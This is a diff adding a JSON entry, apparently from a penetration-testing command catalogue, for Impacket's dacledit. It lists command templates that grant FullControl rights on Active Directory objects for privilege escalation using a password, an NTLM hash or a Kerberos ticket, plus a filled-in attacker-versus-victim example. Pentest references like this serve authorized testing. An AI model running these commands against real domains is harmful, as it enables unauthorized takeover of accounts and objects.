@@ -1,0 +1,41 @@
+{
+  "id": "dacledit",
+  "name": "Impacket dacledit",
+  "command": "impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target '<target>' '<domain>/<user>:<password>' -dc-ip '<ip>'",
+  "description": "Read or write DACL entries on AD objects to grant or abuse ACL rights",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "impacket",
+    "dacl",
+    "acl",
+    "privilege-escalation",
+    "write-dacl",
+    "fullcontrol"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target '<target>' -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target '<target>' -k -no-pass '<domain>/<user>' -dc-ip '<ip>'"
+    },
+    {
+      "label": "Read DACL",
+      "requires": "password",
+      "command": "impacket-dacledit -action 'read' -target '<target>' '<domain>/<user>:<password>' -dc-ip '<ip>'"
+    }
+  ],
+  "examples": [
+    "impacket-dacledit -action 'write' -rights 'FullControl' -principal 'attacker' -target 'victim' 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
+  ]
+}
